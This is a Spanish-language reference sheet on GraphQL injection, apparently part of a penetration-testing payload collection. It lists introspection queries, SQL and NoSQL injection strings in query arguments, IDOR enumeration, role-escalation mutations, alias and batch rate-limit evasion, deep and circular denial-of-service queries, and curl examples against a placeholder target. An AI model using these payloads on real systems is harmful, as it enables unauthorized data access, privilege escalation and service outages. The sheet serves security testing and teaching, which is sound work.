# 📊 Guía de referencia de inyección GraphQL

<!-- language-home-navigation -->
[🏠 Página principal en español](../../README.es.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](GraphQL-Injection.tr.md) • [🇬🇷 Ελληνικά](GraphQL-Injection.el.md)

```
 ██████╗ ██████╗  █████╗ ██████╗ ██╗  ██╗ ██████╗ ██╗     
██╔════╝ ██╔══██╗██╔══██╗██╔══██╗██║  ██║██╔═══██╗██║     
██║  ███╗██████╔╝███████║██████╔╝███████║██║   ██║██║     
██║   ██║██╔══██╗██╔══██║██╔═══╝ ██╔══██║██║▄▄ ██║██║     
╚██████╔╝██║  ██║██║  ██║██║     ██║  ██║╚██████╔╝███████╗
 ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝ ╚══▀▀═╝ ╚══════╝
██╗███╗   ██╗     ██╗███████╗ ██████╗████████╗██╗ ██████╗ ███╗   ██╗
██║████╗  ██║     ██║██╔════╝██╔════╝╚══██╔══╝██║██╔═══██╗████╗  ██║
██║██╔██╗ ██║     ██║█████╗  ██║        ██║   ██║██║   ██║██╔██╗ ██║
██║██║╚██╗██║██   ██║██╔══╝  ██║        ██║   ██║██║   ██║██║╚██╗██║
██║██║ ╚████║╚█████╔╝███████╗╚██████╗   ██║   ██║╚██████╔╝██║ ╚████║
╚═╝╚═╝  ╚═══╝ ╚════╝ ╚══════╝ ╚═════╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝
```

---

## 🔍 Fundamentos de GraphQL

> **Alcance de los ejemplos:** la introspección no es por sí sola una vulnerabilidad y la consulta llamada «completa» aquí solo extrae parte del esquema. Los nombres GraphQL distinguen mayúsculas y minúsculas; los fragmentos cíclicos deben rechazarse durante la validación. El ejemplo con `$ne` como nombre de campo tampoco es sintaxis GraphQL válida: su viabilidad depende de cómo un resolver procese sus entradas. Véase la [especificación GraphQL](https://spec.graphql.org/October2021/).

### Endpoints habituales
```
/graphql
/graphiql
/v1/graphql
/v2/graphql
/api/graphql
/graph
/query
/gql
/playground
```

### Estructura de la solicitud
```graphql
# Consulta
{
  user(id: 1) {
    name
    email
  }
}

# Con nombre de operación
query GetUser {
  user(id: 1) {
    name
  }
}

# Mutación
mutation {
  createUser(name: "test", email: "test@test.com") {
    id
    name
  }
}
```

---

## 🎯 Consultas de introspección

### Introspección del esquema completo
```graphql
{
  __schema {
    types {
      name
      fields {
        name
        type {
          name
        }
      }
    }
  }
}
```

### Tipo Query (puntos de entrada)
```graphql
{
  __schema {
    queryType {
      fields {
        name
        description
        args {
          name
          type {
            name
          }
        }
      }
    }
  }
}
```

### Tipo Mutation
```graphql
{
  __schema {
    mutationType {
      fields {
        name
        args {
          name
          type {
            name
          }
        }
      }
    }
  }
}
```

### Todos los tipos
```graphql
{
  __schema {
    types {
      name
      kind
      description
    }
  }
}
```

### Detalles de un tipo concreto
```graphql
{
  __type(name: "User") {
    name
    fields {
      name
      type {
        name
        kind
      }
    }
  }
}
```

---

## 💉 Ataques de inyección

### Inyección SQL mediante GraphQL
```graphql
# En los argumentos
{
  user(id: "1' OR '1'='1") {
    name
    email
    password
  }
}

# Basada en UNION
{
  user(name: "' UNION SELECT username,password FROM users--") {
    name
  }
}
```

### Inyección NoSQL
```graphql
{
  user(username: "{\"$ne\": null}") {
    name
    email
  }
}

# O como JSON
{
  "query": "{ user(filter: {username: {$ne: \"\"}}) { name email } }"
}
```

### IDOR (Insecure Direct Object Reference)
```graphql
# Acceder a datos de otros usuarios
{
  user(id: 1) { name email password }
}
{
  user(id: 2) { name email password }
}
{
  user(id: 3) { name email password }
}

# Enumerar todos los usuarios
{
  users {
    id
    name
    email
    role
  }
}
```

---

## 🔥 Evasión de autorización

### Falta de autenticación/autorización en mutaciones
```graphql
# Probar operaciones administrativas como usuario normal
mutation {
  deleteUser(id: 1) {
    success
  }
}

mutation {
  updateUserRole(id: 1, role: "admin") {
    id
    role
  }
}
```

### Evasión mediante consultas anidadas
```graphql
# Acceder a datos sensibles mediante relaciones
{
  posts {
    author {
      email
      passwordHash
      adminToken
    }
  }
}

{
  comments {
    user {
      privateMessages {
        content
      }
    }
  }
}
```

### Abuso de las sugerencias de campos
```graphql
# Si las sugerencias están habilitadas, probar campos no válidos
{
  user(id: 1) {
    passwor  # Puede sugerir "password"
  }
}
```

---

## 🚀 Divulgación de información

### Información de depuración
```graphql
# Enumeración basada en errores
{
  __typename
}

# Consulta no válida para obtener una traza de pila
{
  invalid_field_that_doesnt_exist
}
```

### Descubrimiento de campos sensibles
```graphql
{
  user(id: 1) {
    id
    username
    email
    password
    passwordHash
    token
    apiKey
    secret
    privateKey
    ssn
    creditCard
    internalId
  }
}
```

---

## 🛡️ Técnicas de evasión

### Evasión mediante alias
```graphql
# Eludir límites de solicitudes mediante alias
{
  a: user(id: 1) { name }
  b: user(id: 2) { name }
  c: user(id: 3) { name }
  d: user(id: 4) { name }
}
```

### Ataques mediante lotes
```json
[
  {"query": "{ user(id: 1) { email } }"},
  {"query": "{ user(id: 2) { email } }"},
  {"query": "{ user(id: 3) { email } }"}
]
```

### Manipulación de mayúsculas y minúsculas
```graphql
# Probar otras combinaciones de mayúsculas y minúsculas
{
  USER(id: 1) { name }
}
{
  User(id: 1) { name }
}
```

### Inyección de fragmentos
```graphql
{
  user(id: 1) {
    ...sensitiveData
  }
}

fragment sensitiveData on User {
  password
  apiKey
  token
}
```

---

## 💣 Ataques de denegación de servicio (DoS)

### Ataque con consultas profundas
```graphql
{
  user(id: 1) {
    friends {
      friends {
        friends {
          friends {
            friends {
              name
            }
          }
        }
      }
    }
  }
}
```

### Fragmento circular
```graphql
query {
  user(id: 1) {
    ...A
  }
}

fragment A on User {
  ...B
}

fragment B on User {
  ...A  # Referencia circular
}
```

### Conjunto grande de resultados
```graphql
{
  users(first: 999999) {
    id
    name
    email
    posts {
      id
      comments {
        id
      }
    }
  }
}
```

---

## 🛠️ Herramientas de prueba

### GraphQL Voyager
```bash
# Visualizar el esquema
https://graphql-kit.com/graphql-voyager/
# Pegar el resultado de introspección
```

### InQL (extensión de Burp)
```
# Funciones:
- Extracción del esquema
- Generación de consultas
- Escaneo de vulnerabilidades
```

### graphql-cop
```bash
# Herramienta de auditoría de seguridad
pip install graphql-cop
graphql-cop -t https://target.com/graphql
```

### graphw00f
```bash
# Identificación de implementaciones GraphQL
git clone https://github.com/dolevf/graphw00f
python3 main.py -t https://target.com/graphql
```

### Altair GraphQL Client
```
# Cliente de escritorio para pruebas
https://altairgraphql.dev/
```

---

## 📝 Ejemplos de cURL

### Consulta básica
```bash
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ user(id: 1) { name email } }"}'
```

### Con variables
```bash
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "query GetUser($id: Int!) { user(id: $id) { name } }", "variables": {"id": 1}}'
```

### Introspección
```bash
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { types { name } } }"}'
```

### Con autenticación
```bash
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer TOKEN" \
  -d '{"query": "{ me { name } }"}'
```

---

## 📋 Lista de comprobación de pruebas

```markdown
## Lista de comprobación de seguridad GraphQL

□ Identificar endpoints GraphQL
□ Comprobar la introspección (extracción del esquema)
□ Extraer todas las consultas y mutaciones
□ Probar IDOR en consultas de objetos
□ Probar la autorización de las mutaciones
□ Comprobar inyección SQL/NoSQL en argumentos
□ Probar consultas anidadas para detectar filtraciones de datos
□ Comprobar límites de solicitudes y evasión con alias
□ Probar consultas en lote
□ Buscar campos sensibles (password, token)
□ Probar los límites de profundidad (DoS)
□ Comprobar la divulgación de errores
□ Probar endpoints de suscripción
```

---

## 🔗 Resumen de vulnerabilidades habituales

| Vulnerabilidad | Prueba | Impacto |
|---------------|------|--------|
| **Introspección habilitada** | Consulta `__schema` | Divulgación del esquema |
| **IDOR** | Cambiar los ID de las consultas | Acceder a datos de otros usuarios |
| **Falta de autenticación** | Consultar sin token | Acceso no autorizado |
| **SQLi/NoSQLi** | Inyectar en los argumentos | Compromiso de la base de datos |
| **Datos excesivos** | Consultar campos sensibles | Filtración de datos |
| **DoS** | Consultas profundas o circulares | Servicio no disponible |
| **Abuso de lotes** | Varias consultas | Evasión de límites de solicitudes |

---

## 🔗 Payloads relacionados

- [Payloads SQLi](./SQLi.es.md)
- [Inyección NoSQL](./NoSQL-Injection.es.md)
- [Seguridad de API](../../API-Security/translations/README.es.md)

---

**Volver a los payloads:** [💉 Colección de payloads](../../README.md#-payloads-collection)
